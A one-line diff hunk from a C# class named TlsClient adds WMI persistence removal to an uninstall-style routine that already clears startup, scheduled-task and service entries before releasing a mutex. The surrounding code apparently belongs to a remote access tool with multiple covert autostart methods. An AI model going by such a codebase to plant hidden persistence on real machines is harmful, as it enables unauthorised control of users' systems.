@@ -1621,6 +1621,7 @@ internal class TlsClient : IDisposable
             Persistence.RemoveStartup(Config.PersistName);
             Persistence.RemoveScheduledTask(Config.PersistName);
             Persistence.RemoveService(Config.PersistName);
+            Persistence.RemoveWmi(Config.PersistName);
 
             Program.ReleaseMutex();
 
